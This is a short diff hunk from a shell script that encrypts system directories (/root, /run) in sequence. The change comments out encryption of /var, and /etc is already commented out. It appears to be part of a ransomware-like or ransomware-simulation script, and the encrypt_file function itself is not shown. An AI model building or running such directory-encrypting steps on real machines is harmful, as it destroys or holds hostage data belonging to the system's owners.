@@ -30,8 +30,8 @@ sleep 5
 encrypt_file "/root"
 sleep 5
 encrypt_file "/run"
-sleep 5
-encrypt_file "/var"
+# sleep 5
+# encrypt_file "/var"
 sleep 15
 # encrypt_file "/etc"
 # sleep 5
